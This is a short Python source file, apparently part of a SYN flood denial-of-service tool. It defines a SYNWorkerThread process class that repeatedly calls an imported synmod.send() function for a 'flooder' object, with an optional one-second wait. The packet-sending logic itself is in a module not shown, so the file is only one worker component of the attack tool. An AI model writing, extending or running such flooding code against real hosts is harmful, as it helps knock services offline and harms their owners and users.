import socket, time
from Functions import *
from multiprocessing import Process
import synmod

class SYNWorkerThread(Process):

    def __init__(self, flooder, id):
        Process.__init__(self)
        self.id = id

        self.flooder = flooder
        self.running = True
        self.byteCount = 0

    def stop(self):
        self.running = False

    def run(self):
        try:
            while self.running:
                synmod.send()
                if self.flooder.wait:
                    time.sleep(1)
        except KeyboardInterrupt:
            return
